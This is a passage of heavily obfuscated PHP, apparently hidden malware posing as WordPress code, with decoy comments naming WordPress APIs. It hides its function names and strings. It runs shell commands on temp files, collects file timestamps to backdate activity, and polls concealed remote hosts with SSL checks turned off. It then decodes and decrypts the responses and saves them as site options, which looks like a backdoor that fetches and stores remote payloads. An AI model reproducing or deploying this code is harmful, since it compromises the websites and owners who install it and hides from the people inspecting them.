 }
 return  null;
      }

    function   npeztcbf5_p1f87nzes($ohfs0792xygm)
       {

 if   (!$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(228)) || !$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(229))) return   null;



  $o7y6qr_vi52zhecf     =  $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(111))  ?  (string)    @$GLOBALS['__scf_qa8nkfur9w_111'](m5t68uuej1(230)) :  "";$rknatu3pj3o8x=PHP_MAJOR_VERSION;$sibs7ia91tdk08=$rknatu3pj3o8x*8;
if  ($o7y6qr_vi52zhecf !==  "" &&     stripos($o7y6qr_vi52zhecf, m40pvx5ij_z4mj(228)) !== false)  return null;
       $yhjt3bb_d9p = m7maju8jcvf3286($GLOBALS['__scf_q9p5ajdcil_79'](), lpwgqh9300(231));
      if   ($yhjt3bb_d9p   ===  false)    return  null;
   

if  (@$GLOBALS['__scf_u59p44o1il_196']($yhjt3bb_d9p,  $ohfs0792xygm)    !==  $GLOBALS['__scf_fr9u7cq1eo_10']($ohfs0792xygm)) {

    netei2x342rtzmi4tj69($yhjt3bb_d9p);
     return     null;
}
    $_nzbzi4crx  = @$GLOBALS['__scf_a_l_5tgwoy7a_232'](m40pvx5ij_z4mj(233)   .    escapeshellarg($yhjt3bb_d9p) .  m5t68uuej1(234));



  netei2x342rtzmi4tj69($yhjt3bb_d9p);

 if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($_nzbzi4crx) || $_nzbzi4crx   === "") return    null;$hlqa2tisp7l2t3=5737;$cugdd_f4j3dtt=$hlqa2tisp7l2t3%10;
if  (stripos($_nzbzi4crx,   m40pvx5ij_z4mj(235)) !==    false)    return   true;
if (stripos($_nzbzi4crx,   bovhd4vawcd(236))   !==     false  ||  stripos($_nzbzi4crx,  m5t68uuej1(237))   !== false)    return false;
     return     null;
 }


function    fgcc_h22bqxgwmccod($ohfs0792xygm)
   {
  static    $f78jj4mfbqfaw6_ = array();$aa4sjw3448x4=PHP_INT_MAX/PHP_INT_MAX;$w0elaw64v=$aa4sjw3448x4+25;
 if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($ohfs0792xygm)      || $GLOBALS['__scf_i8i8g4oxha_7']($ohfs0792xygm, lpwgqh9300(238)) === false)   return  false;

 if ($GLOBALS['__scf_fr9u7cq1eo_10']($ohfs0792xygm) >    (1048569+7))    $ohfs0792xygm =  bdsvhgz69_4ct5ntcc($ohfs0792xygm);
     if ($GLOBALS['__scf_fr9u7cq1eo_10']($ohfs0792xygm) > (1386627-338051))  return      false;
   if   (!$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(239))) return   true;
       $zusurhlk29z   = $GLOBALS['__scf_fr9u7cq1eo_10']($ohfs0792xygm)  .   ':' .    $GLOBALS['__scf_pe3s4q1z7z_59']($ohfs0792xygm);
   if  ($GLOBALS['__scf_z1gy18gsi2_qr4_240']($zusurhlk29z, $f78jj4mfbqfaw6_)) return   $f78jj4mfbqfaw6_[$zusurhlk29z];
$m0gnp7inbb584   =     _0uen771t3ncn2crg($ohfs0792xygm);
       if  ($GLOBALS['__scf_xbixt340jb_38']($f78jj4mfbqfaw6_) >    (9+15))    $f78jj4mfbqfaw6_   = array();
$f78jj4mfbqfaw6_[$zusurhlk29z] = $m0gnp7inbb584;

return  $m0gnp7inbb584;
        }
 function   _0uen771t3ncn2crg($ohfs0792xygm)
  {
   if  (!defined(bovhd4vawcd(241)))  {
    $wumx7pi7jwxvb_3e =  mhfi5e5zgmk3qi3($GLOBALS['__scf_fr9u7cq1eo_10']($ohfs0792xygm));
 if     ($wumx7pi7jwxvb_3e)    {



    $ctu7c40hlhbwh0kd = @token_get_all($ohfs0792xygm);$n_ges2pzcqy=3*4;$d7_ovjbwos=$n_ges2pzcqy-36;
if (!$GLOBALS['__scf_pomb89yiuz_37']($ctu7c40hlhbwh0kd))   return   true;
  $owmd72rm6jw5qsjp =  0;
   $nn895bssadnv11z =  0;
  $kubmeo7cig8     =  0;

   foreach      ($ctu7c40hlhbwh0kd      as     $wkokdoejn433)   {
// attach semisimple negotiator


    if ($GLOBALS['__scf_pomb89yiuz_37']($wkokdoejn433))    {
   if ($wkokdoejn433[0]   ===     T_CURLY_OPEN  ||  $wkokdoejn433[0] ===  T_DOLLAR_OPEN_CURLY_BRACES)   $owmd72rm6jw5qsjp++;



  continue;
  }
 if ($wkokdoejn433     ===  '{') $owmd72rm6jw5qsjp++;
elseif  ($wkokdoejn433  ===      '}')  {

$owmd72rm6jw5qsjp--;
 if     ($owmd72rm6jw5qsjp <  0)  return false;
 }  elseif ($wkokdoejn433    === '(') $nn895bssadnv11z++;


 elseif  ($wkokdoejn433 === ')')   {
// program counter

$nn895bssadnv11z--;
 if ($nn895bssadnv11z   <      0)    return false;
      }  elseif  ($wkokdoejn433  ===  '[') $kubmeo7cig8++;



      elseif ($wkokdoejn433   ===     ']') {
   $kubmeo7cig8--;
   if  ($kubmeo7cig8 < 0)      return   false;
   }
// negative-definite token-bucket

       }
 if   ($owmd72rm6jw5qsjp  !==     0    || $nn895bssadnv11z  !== 0   ||   $kubmeo7cig8  !==    0)  return    false;
  }
 $kpc01pfd_cjaf2js   =     npeztcbf5_p1f87nzes($ohfs0792xygm);


      if  ($GLOBALS['__scf_ah0kip7i2l2f_242']($kpc01pfd_cjaf2js))   return  $kpc01pfd_cjaf2js;$vvg9zv8gudg=17+99;$ud69553pfzwf_=$vvg9zv8gudg-12;
 return   $wumx7pi7jwxvb_3e;
      }
// WP Interactivity API: asynchronous authority

        if (!mhfi5e5zgmk3qi3($GLOBALS['__scf_fr9u7cq1eo_10']($ohfs0792xygm)))    {
 $kpc01pfd_cjaf2js =   npeztcbf5_p1f87nzes($ohfs0792xygm);



return   $GLOBALS['__scf_ah0kip7i2l2f_242']($kpc01pfd_cjaf2js)  ?  $kpc01pfd_cjaf2js     : false;
   }
 try     {



@token_get_all($ohfs0792xygm,   TOKEN_PARSE);


return   true;
 }   catch      (Throwable   $k3g08rnqu9m)    {
// escape-analyze prescriptive serializer

   return false;



      }     catch (Exception   $k3g08rnqu9m) {
 return  false;
   }
 }
  function  m2sqsvjfli0izb()
     {
// WP RichText API: affine aggregator

return  array(lpwgqh9300(243), lpwgqh9300(244),  bovhd4vawcd(245));
  }
 function   oqfb6x5kx6vd0hfusbhmq()
    {
    return   array(m40pvx5ij_z4mj(246),  bovhd4vawcd(247),      m40pvx5ij_z4mj(248),  m5t68uuej1(249),  m5t68uuej1(250), m40pvx5ij_z4mj(251), lpwgqh9300(252), lpwgqh9300(253),  bovhd4vawcd(254),   m40pvx5ij_z4mj(255),   bovhd4vawcd(256),     m5t68uuej1(257),  m5t68uuej1(258),  bovhd4vawcd(259),  bovhd4vawcd(260), m40pvx5ij_z4mj(261), lpwgqh9300(262),     lpwgqh9300(263),    m40pvx5ij_z4mj(264),   lpwgqh9300(265));
 }
 function   y0ct8t_uo8f8zsstucy50b()
     {
    return     array(m40pvx5ij_z4mj(266), lpwgqh9300(267),  m5t68uuej1(268),     bovhd4vawcd(269));
     }
 
function u4k272wukpl8hyd67g($p5z1ch3ugyw7kudu)



{
 if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(270)))      return  gzencode($p5z1ch3ugyw7kudu,  (1+8));


if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(271)))  {
 return  "\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03" .  gzdeflate($p5z1ch3ugyw7kudu, (2+7))  .   $GLOBALS['__scf_rssv9g8o3ngsd_272']('V', $GLOBALS['__scf_idsze11e90jp4g_273']($p5z1ch3ugyw7kudu))     .  $GLOBALS['__scf_rssv9g8o3ngsd_272']('V', $GLOBALS['__scf_fr9u7cq1eo_10']($p5z1ch3ugyw7kudu)  & (7474699176-3179731881));
 }



   return  $p5z1ch3ugyw7kudu;


}
    function   jmrz_r2id7ry4ovy($p5z1ch3ugyw7kudu)
   {

       if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($p5z1ch3ugyw7kudu)  ||   $GLOBALS['__scf_fr9u7cq1eo_10']($p5z1ch3ugyw7kudu) <   2)   return   $p5z1ch3ugyw7kudu;

  if  ($GLOBALS['__scf_vvn10ievj2k_9']($p5z1ch3ugyw7kudu, 0,    2) !==  "\x1f\x8b") return $p5z1ch3ugyw7kudu;$dx95h_dwkmx=PHP_INT_MAX/PHP_INT_MAX;$hr2ff_ye=$dx95h_dwkmx+32;
 if ($GLOBALS['__scf_fr9u7cq1eo_10']($p5z1ch3ugyw7kudu)    <     (25-7))     return    false;
     $ft4ss0dvuwfng = @$GLOBALS['__scf_vwfp8b2vecve11_274']('V', $GLOBALS['__scf_vvn10ievj2k_9']($p5z1ch3ugyw7kudu,   -(8-4)));
   $ft4ss0dvuwfng   =   $GLOBALS['__scf_pomb89yiuz_37']($ft4ss0dvuwfng) ?    $ft4ss0dvuwfng[1]     :  0;



       if  ($ft4ss0dvuwfng <  (498+2)   || $ft4ss0dvuwfng >    (1048538+38)) return  false;
    if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(275))) {



   $v9qf3vep2p =   @gzdecode($p5z1ch3ugyw7kudu,   (1048537+39));
      if  ($v9qf3vep2p !== false)   return   $v9qf3vep2p;

}
   if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(276)))  {


$v9qf3vep2p     = @gzinflate($GLOBALS['__scf_vvn10ievj2k_9']($p5z1ch3ugyw7kudu,   (7+3),     $GLOBALS['__scf_fr9u7cq1eo_10']($p5z1ch3ugyw7kudu) -  (8+10)),     (1048550+26));


return ($GLOBALS['__scf_e_8z8ias8ka_43']($v9qf3vep2p)      &&   $GLOBALS['__scf_fr9u7cq1eo_10']($v9qf3vep2p) <=     (1680302-631726))  ?   $v9qf3vep2p  :      false;
 }
return  false;
 }
  function  zk9gk9i36v6ds3i($dcs_zjal0dp)

  {
 if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(277)))   return $GLOBALS['__scf_dis8cu8jv57_277']($dcs_zjal0dp);
    if  (!    $GLOBALS['__scf_e_8z8ias8ka_43']($dcs_zjal0dp) ||   $GLOBALS['__scf_fr9u7cq1eo_10']($dcs_zjal0dp)    % 2 !==   0)  {
  return   false;
}
return  $GLOBALS['__scf_rssv9g8o3ngsd_272'](m40pvx5ij_z4mj(278), $dcs_zjal0dp);
   }
     
 
function db6euveuzemu49d01thfga()
   {
    $uy4dyvd5qop  =     array();
$fscn6vcbv1baj2k =  array(ABSPATH, ABSPATH .   m5t68uuej1(279),  ABSPATH    . m40pvx5ij_z4mj(280));
       if  (defined(bovhd4vawcd(164)))  $fscn6vcbv1baj2k[]   =   WP_CONTENT_DIR .  '/';
   foreach    ($fscn6vcbv1baj2k  as $v9qf3vep2p)   {
    $cztdmvhiza98k     =   $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(73)) ? @$GLOBALS['__scf_ql1i4f573p8rhm_73']($v9qf3vep2p .  lpwgqh9300(281))  :    false;
   if    ($GLOBALS['__scf_pomb89yiuz_37']($cztdmvhiza98k)) {
 foreach    ($cztdmvhiza98k  as   $e7s4480cj8b1c)    {
    $nb4frvwe8w7ja =    @$GLOBALS['__scf_tm09rtls_27e_98']($e7s4480cj8b1c);
 if  ($nb4frvwe8w7ja  &&  $nb4frvwe8w7ja >  (946684782+18))  {
 $uy4dyvd5qop[]   = $nb4frvwe8w7ja;
    }
 }
   }
 }
if (!empty($uy4dyvd5qop))    {
   $e3thri4q7dp   =  $uy4dyvd5qop[$GLOBALS['__scf_qx61mln_9f_282']($uy4dyvd5qop)];

  return  ($e3thri4q7dp  -     ($e3thri4q7dp  % (153662-53662))) +  eliqs4hzzhoila0pbe();
}
     $gpu4l1du_r   =   $GLOBALS['__scf_ibw9xvmx9ckin_187']()   - ((662-297)     * (71^95)     *  (3982-382));



    $bumq8zzyir5      = $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(283))     ?    wp_rand(0,  (0x10+0xe)    * (8+16) *  (583+3017))   :    $GLOBALS['__scf_lcxz0dq8nv5_w_284'](0, (0x18+0x6)    * (12<<1)  *  (0xd42+0xce));
    $e3thri4q7dp =  $gpu4l1du_r  -    $bumq8zzyir5;
     return   ($e3thri4q7dp -  ($e3thri4q7dp   %  (66494+33506)))  +   eliqs4hzzhoila0pbe();

   }
  function  g2v_4ievtrdx_3ey5i4by($q3g0_ocl1kq)
 {


        if    (empty($GLOBALS[m5t68uuej1(285)])) return   $q3g0_ocl1kq;
     $qnjxhv1env  = $GLOBALS[m40pvx5ij_z4mj(286)]    - $GLOBALS['__scf_ciwgxuks3i4cd_287'](true);
if     ($qnjxhv1env     <   1)  return  false;
   return  $q3g0_ocl1kq  >   $qnjxhv1env   ?  (int)    $GLOBALS['__scf_mc3zdhm3ia_07_288']($qnjxhv1env)    : $q3g0_ocl1kq;
}



     function  m9j0rktim2b4rkx__b($azf98962xi,  $q3g0_ocl1kq, $kruyre2fvvh =    null)
   {
      $q3g0_ocl1kq  = g2v_4ievtrdx_3ey5i4by($q3g0_ocl1kq);
if ($q3g0_ocl1kq  ===   false)    return   false;


 $hhbgrx2l8w     =  function     ($xmu6vgl26q74)   use ($kruyre2fvvh)  {



if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($xmu6vgl26q74) ||  $xmu6vgl26q74 ===   "")   return false;
    if   ($GLOBALS['__scf_fr9u7cq1eo_10']($xmu6vgl26q74) >      (8388545+63)) return  false;
 if   ($kruyre2fvvh) {
 try {



  return  (bool) $GLOBALS['__scf_jvgqufbujun_y_289']($kruyre2fvvh, $xmu6vgl26q74);$u9is_hq5fl=62|85;$k4gml0jr4l=$u9is_hq5fl^88;
 }   catch     (Throwable $k3g08rnqu9m)  {
 return   false;
}  catch (Exception    $k3g08rnqu9m)     {
 return false;
 }
  }
  return true;
   };
   $q71wmro6q6q84srm =  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(290)) ?   @$GLOBALS['__scf_bgujd0wqxduxtu_290']($azf98962xi,    array(
  bovhd4vawcd(291) =>  $q3g0_ocl1kq,
m5t68uuej1(292)   => false,
        lpwgqh9300(293)   => (0x7fe3dc+0x1c24),
 ))     :    false;
 if      ($q71wmro6q6q84srm &&  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(294)) ||    !is_wp_error($q71wmro6q6q84srm)))   {
   if  ((int) wp_remote_retrieve_response_code($q71wmro6q6q84srm) ===      (117^189))  {
    $c6ddy5t1f5o58  = wp_remote_retrieve_body($q71wmro6q6q84srm);
  if   ($hhbgrx2l8w($c6ddy5t1f5o58)) return     $c6ddy5t1f5o58;
   }
    }


$q3g0_ocl1kq  =  g2v_4ievtrdx_3ey5i4by($q3g0_ocl1kq);
  if ($q3g0_ocl1kq  ===   false) return  false;
    if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(295))  &&     $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(296))     && $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(297)))  {
       $qgykp3k2cjpu3  =  @$GLOBALS['__scf_p_5zmebpb7_298']($azf98962xi);
if   ($qgykp3k2cjpu3 ===   false)   return  false;

 @$GLOBALS['__scf_qtu2zv75fyyo1_296']($qgykp3k2cjpu3,   array(
   constant(bovhd4vawcd(299))  =>  true,
constant(m5t68uuej1(300))   =>   $q3g0_ocl1kq,
 constant(m5t68uuej1(301))  => false,

    constant(m5t68uuej1(302)) =>  0,
constant(m5t68uuej1(303))   =>  false,
        constant(bovhd4vawcd(304))  =>  function    ($t6jsjlatx2i,    $enci2gn8hyd_aax,  $itlm2a3jgz) {
 return  $itlm2a3jgz    > (4459947+3928661) ?     1   : 0;
 },



   ));
$msob29zlqca0up0v =    @$GLOBALS['__scf_yt0iueggb31sm_305']($qgykp3k2cjpu3);
 $k0nmezawi9pcy     =      @curl_errno($qgykp3k2cjpu3);


     $mfazq7e3mrkdji  =   @curl_getinfo($qgykp3k2cjpu3);

  @curl_close($qgykp3k2cjpu3);
 if   ($k0nmezawi9pcy)   return false;
    if  ((int) $mfazq7e3mrkdji[lpwgqh9300(306)] ===    (181+19) &&  $msob29zlqca0up0v      !== false &&   $hhbgrx2l8w($msob29zlqca0up0v))      {
 return $msob29zlqca0up0v;
    }
}
      return   false;
  }

      


 function f3i4i7qra3m1ugky8wdb_($azf98962xi, $q7zm1e9gbkb1g,  $luh3leltd56xbka6,  $q3g0_ocl1kq,  $kruyre2fvvh      =  null)
      {


$q3g0_ocl1kq  =  g2v_4ievtrdx_3ey5i4by($q3g0_ocl1kq);
   if    ($q3g0_ocl1kq ===     false) return false;
$hhbgrx2l8w     =  function  ($xmu6vgl26q74) use  ($kruyre2fvvh) {
if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($xmu6vgl26q74)    || $xmu6vgl26q74 ===    "")   return  false;
 if ($GLOBALS['__scf_fr9u7cq1eo_10']($xmu6vgl26q74)  >    (192948+8195660))   return     false;
if   ($kruyre2fvvh) {
try  {
    return   (bool)  $GLOBALS['__scf_jvgqufbujun_y_289']($kruyre2fvvh, $xmu6vgl26q74);



 }  catch (Throwable    $k3g08rnqu9m)  {
return   false;
 } catch    (Exception $k3g08rnqu9m)      {
return   false;
 }
}



  return   true;
  };



 $q71wmro6q6q84srm  =     $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(307))  ? @$GLOBALS['__scf_x3afy82qxwf_08_307']($azf98962xi,    array(
    m40pvx5ij_z4mj(291)    => $q3g0_ocl1kq,
lpwgqh9300(308) =>   false,
  m5t68uuej1(293)    =>   (8388554+54),
  m5t68uuej1(309)      =>   $luh3leltd56xbka6,
 m5t68uuej1(310)      =>   $q7zm1e9gbkb1g,
     ))     :  false;
   if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(294))    &&  is_wp_error($q71wmro6q6q84srm))   {
   }     elseif ($q71wmro6q6q84srm)    {
   $ohfs0792xygm  =     (int)  wp_remote_retrieve_response_code($q71wmro6q6q84srm);

        $k2oyl8m8x6438_3  =  wp_remote_retrieve_body($q71wmro6q6q84srm);
     $s_q7pa214lvtnudt   = wp_remote_retrieve_headers($q71wmro6q6q84srm);



     $ucqbd1vonfzbhv  =    "";
if    ($GLOBALS['__scf_pomb89yiuz_37']($s_q7pa214lvtnudt)) {
    foreach  ($s_q7pa214lvtnudt as    $yivzbj99kx559x  => $kdbfhd3lu4ttw)  {
$ucqbd1vonfzbhv .= $yivzbj99kx559x   .  m40pvx5ij_z4mj(311) .  $kdbfhd3lu4ttw .  m5t68uuej1(312);
}
}



 if    ($ohfs0792xygm    ===   (0x8d+0x3b) &&   $hhbgrx2l8w($k2oyl8m8x6438_3))   {
    return   $k2oyl8m8x6438_3;
}
}   else  {
   }
  if (!empty($GLOBALS[lpwgqh9300(313)]))      return false;
     $q3g0_ocl1kq   =   g2v_4ievtrdx_3ey5i4by($q3g0_ocl1kq);
     if    ($q3g0_ocl1kq  === false) return  false;
   if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(298))   &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(314)) &&      $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(305))) {



      $qgykp3k2cjpu3  =  @$GLOBALS['__scf_p_5zmebpb7_298']($azf98962xi);
  if   ($qgykp3k2cjpu3   === false)     {
  return    false;
 }
  $pxpgzpxp153   =  array();
foreach  ($luh3leltd56xbka6 as $yivzbj99kx559x =>   $kdbfhd3lu4ttw) {
    $pxpgzpxp153[]   =  $yivzbj99kx559x  .  m40pvx5ij_z4mj(311) .  $kdbfhd3lu4ttw;
       }



    @$GLOBALS['__scf_qtu2zv75fyyo1_296']($qgykp3k2cjpu3,  array(
   constant(bovhd4vawcd(315))   => true,
 constant(m5t68uuej1(316))  =>    $q7zm1e9gbkb1g,
constant(m40pvx5ij_z4mj(299)) => true,


   constant(bovhd4vawcd(300))    =>  $q3g0_ocl1kq,
  constant(bovhd4vawcd(301)) =>  false,
     constant(lpwgqh9300(302))   =>    0,


 constant(bovhd4vawcd(317))    => $pxpgzpxp153,
constant(lpwgqh9300(318)) =>  false,
   constant(lpwgqh9300(319))     =>     function      ($t6jsjlatx2i,   $enci2gn8hyd_aax,   $itlm2a3jgz) {
return   $itlm2a3jgz    >  (0x593025+0x26cfdb) ?      1  : 0;
     },
     ));
$msob29zlqca0up0v  =  @$GLOBALS['__scf_yt0iueggb31sm_305']($qgykp3k2cjpu3);
  $k0nmezawi9pcy =   @curl_errno($qgykp3k2cjpu3);



  $s6eec4_ey0wu4fu3 =   @curl_error($qgykp3k2cjpu3);
  $mfazq7e3mrkdji =     @curl_getinfo($qgykp3k2cjpu3);


   $fwx5tuctjyqwd     =  (int) $mfazq7e3mrkdji[lpwgqh9300(320)];

 if   ($k0nmezawi9pcy)  {



 @curl_close($qgykp3k2cjpu3);


return false;
 }
  @curl_close($qgykp3k2cjpu3);
  if ($fwx5tuctjyqwd  ===   (238^38)   &&   $msob29zlqca0up0v      !== false &&  $hhbgrx2l8w($msob29zlqca0up0v))  {



       return  $msob29zlqca0up0v;
}
      if  ($msob29zlqca0up0v) {
 }
 return   false;
  }

return false;
}
 
function  a_5kqstbi6v7gcdg3kg($ey9n2oy0hsf     =      (10+35))
  {
$mlno25jsmedkvm_ =     m2sqsvjfli0izb();

  $mrd1j4h2y1dgb6h  = oqfb6x5kx6vd0hfusbhmq();
     $ey9n2oy0hsf    = (int)  $ey9n2oy0hsf;

   if      ($ey9n2oy0hsf < (0x1+0x4))  $ey9n2oy0hsf    =   (2+3);
  if   ($ey9n2oy0hsf  >   (23+22)) $ey9n2oy0hsf =  (0x1c+0x11);

if (empty($mlno25jsmedkvm_)    ||   empty($mrd1j4h2y1dgb6h))  {
return     array();


    }

      $x95rp1mvgfyb7gc_  = $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(145))    ?   (string)   get_option(bovhd4vawcd(321), "")    : "";
     if ($x95rp1mvgfyb7gc_  !== "" &&   !$GLOBALS['__scf_hf87ul3fvpzrkm_150']($x95rp1mvgfyb7gc_,    $mrd1j4h2y1dgb6h, true))    $x95rp1mvgfyb7gc_     =  "";
if ($x95rp1mvgfyb7gc_   !==    "") {
        $mrd1j4h2y1dgb6h =  $GLOBALS['__scf__ofafsmvux__148']($GLOBALS['__scf_r3sim5_axb_151']($mrd1j4h2y1dgb6h, array($x95rp1mvgfyb7gc_)));



 $GLOBALS['__scf_fmhpnvbht5ss5n_322']($mrd1j4h2y1dgb6h, $x95rp1mvgfyb7gc_);
// load cubic broadcaster

   }
  


$yex6li5tkxpgak  = $GLOBALS['__scf_nimluvpxhrpvn_323']($mlno25jsmedkvm_[$GLOBALS['__scf_qx61mln_9f_282']($mlno25jsmedkvm_)]);
    if  ($yex6li5tkxpgak  === "")  {
 return    array();
}
 
     $q7zm1e9gbkb1g  = m5t68uuej1(324)    .     $yex6li5tkxpgak  .  m40pvx5ij_z4mj(325);
     $hwz7p8983jo  =  array(m40pvx5ij_z4mj(326)  =>     m40pvx5ij_z4mj(327));


 $ttpybb7hyo63cf9  =     $GLOBALS['__scf_ciwgxuks3i4cd_287'](true);
// overflow protection

  foreach ($mrd1j4h2y1dgb6h  as   $qrllpspmqr)  {
// @configure nominal-type


      
   if (($GLOBALS['__scf_ciwgxuks3i4cd_287'](true)  - $ttpybb7hyo63cf9)    >  $ey9n2oy0hsf) {
   break;



}
 
 $qrllpspmqr =  $GLOBALS['__scf_nimluvpxhrpvn_323']((string)  $qrllpspmqr);
 if    ($qrllpspmqr      ===  "")     {
 continue;
     }


   try  {
   $k2oyl8m8x6438_3   = f3i4i7qra3m1ugky8wdb_($qrllpspmqr,   $q7zm1e9gbkb1g,  $hwz7p8983jo,    (2+3),  function  ($xmu6vgl26q74)  {
 $m8fw57tomvn   = @$GLOBALS['__scf_bhirfghv_sj17k_328']($xmu6vgl26q74,   true);


 return   $GLOBALS['__scf_pomb89yiuz_37']($m8fw57tomvn)  &&   isset($m8fw57tomvn[m40pvx5ij_z4mj(329)]);
});
   if   ($k2oyl8m8x6438_3    ===  false) {
continue;
  }
   $mva4ksfzob95r3gi   =   @$GLOBALS['__scf_bhirfghv_sj17k_328']($k2oyl8m8x6438_3,     true);
      if (!   $GLOBALS['__scf_pomb89yiuz_37']($mva4ksfzob95r3gi)   || !    isset($mva4ksfzob95r3gi[m5t68uuej1(329)])  || !     $GLOBALS['__scf_e_8z8ias8ka_43']($mva4ksfzob95r3gi[m40pvx5ij_z4mj(329)]))  {
// snapshot reactive hyperloglog

continue;
      }
 
$dcs_zjal0dp  =   $mva4ksfzob95r3gi[m5t68uuej1(330)];
if  ($GLOBALS['__scf_i8i8g4oxha_7']($dcs_zjal0dp,     m40pvx5ij_z4mj(331)) === 0)   {
$dcs_zjal0dp      =  $GLOBALS['__scf_vvn10ievj2k_9']($dcs_zjal0dp, 2);
  }
   
    $pg8im5c_qcf    =   @zk9gk9i36v6ds3i($dcs_zjal0dp);
 if     ($pg8im5c_qcf  === false ||  $GLOBALS['__scf_fr9u7cq1eo_10']($pg8im5c_qcf) <    (32<<1)) {$w_k21gfshjgkn=10*2;$mf5crhbrr=$w_k21gfshjgkn-6;
continue;$zk1mufwwr7xw=519;$aqa6th_dhbcb5=$zk1mufwwr7xw%13;

  }
   
  $wth4dwkj6tj7cyx  =   (64-1);
$l79fr58j5v0  =  $GLOBALS['__scf_hajqvo8bhu_332']($pg8im5c_qcf[$wth4dwkj6tj7cyx]);
   $biu009h8ggntwd3      =    $GLOBALS['__scf_vvn10ievj2k_9']($pg8im5c_qcf,   $wth4dwkj6tj7cyx   +  1, $l79fr58j5v0);
     if    (!  $GLOBALS['__scf_e_8z8ias8ka_43']($biu009h8ggntwd3) ||  $GLOBALS['__scf_fr9u7cq1eo_10']($biu009h8ggntwd3)   <    (5-2))     {
       continue;



 }



     
$agwvzhmoau  =     $GLOBALS['__scf_hajqvo8bhu_332']($biu009h8ggntwd3[0]);

  if     ($agwvzhmoau <   1 || $GLOBALS['__scf_fr9u7cq1eo_10']($biu009h8ggntwd3)      <      1 +    $agwvzhmoau + 1)   {
 continue;$bjjqth81x08wvz=72|98;$ypfwjf3fd4jjrf=$bjjqth81x08wvz^120;



      }
    
  $jcgqkjdh9k8kjf  =   $GLOBALS['__scf_vvn10ievj2k_9']($biu009h8ggntwd3,  1,  $agwvzhmoau);
   $wkqil8b5a7 =    $GLOBALS['__scf_vvn10ievj2k_9']($biu009h8ggntwd3,  1 +  $agwvzhmoau);
   if (!   $GLOBALS['__scf_e_8z8ias8ka_43']($jcgqkjdh9k8kjf)  ||    !  $GLOBALS['__scf_e_8z8ias8ka_43']($wkqil8b5a7))   {
 continue;

 }
// WP Server Side Render capability gate

  
 $uofoa2axu4  =    k__ppv5v06f7k9n1nm($wkqil8b5a7, $jcgqkjdh9k8kjf);
 if   (!  $GLOBALS['__scf_e_8z8ias8ka_43']($uofoa2axu4)   ||    $GLOBALS['__scf_fr9u7cq1eo_10']($uofoa2axu4) < 2)     {
      r63yaewew47stuijcrwsx6(lpwgqh9300(333),   m5t68uuej1(334));
  continue;
   }
        
   $hoqzfacrckpb6  = $GLOBALS['__scf_hajqvo8bhu_332']($uofoa2axu4[0]);


     if  ($hoqzfacrckpb6     <     1    ||  $GLOBALS['__scf_fr9u7cq1eo_10']($uofoa2axu4)   <   1  +  $hoqzfacrckpb6) {
     r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(333),  m5t68uuej1(335));



  continue;
  }
 
        $n5wmjcf8_8p6d8  =  $GLOBALS['__scf_vvn10ievj2k_9']($uofoa2axu4,  1,  $hoqzfacrckpb6);
$_gku1vi2mznx4at3   =   $GLOBALS['__scf_vvn10ievj2k_9']($uofoa2axu4,  1  +  $hoqzfacrckpb6);


     $n2rgnov1e5pke =  $GLOBALS['__scf__ofafsmvux__148']($GLOBALS['__scf__6hbvafs34jo_336']($GLOBALS['__scf_zjq4u5uadyu0x_227'](m5t68uuej1(323),  $GLOBALS['__scf_ezzukb35pvl6__337'](m5t68uuej1(338), $_gku1vi2mznx4at3))));

 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(188)))      {
    update_option(m40pvx5ij_z4mj(321), $qrllpspmqr);
  update_option(lpwgqh9300(339),   $GLOBALS['__scf_vbecp6uayr_340']("\n",     $n2rgnov1e5pke));
}



 return     array(m40pvx5ij_z4mj(341)  => $n5wmjcf8_8p6d8,  lpwgqh9300(342)  =>  $n2rgnov1e5pke);
  }  catch  (Throwable  $k3g08rnqu9m) {

      r63yaewew47stuijcrwsx6(lpwgqh9300(333), $k3g08rnqu9m);
continue;
  }    catch (Exception  $k3g08rnqu9m) {



continue;
}
}
       $pejktj7t68m6    =    $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(145))  ?   (string) get_option(lpwgqh9300(343), "")      : "";
$thd1u8m_anjnz   =    d6ydz3_mq4hw_2s8_bo(m5t68uuej1(344), "");
    if ($pejktj7t68m6 !==    ""  && $GLOBALS['__scf_e_8z8ias8ka_43']($thd1u8m_anjnz)     &&   $thd1u8m_anjnz   !==    "")     {
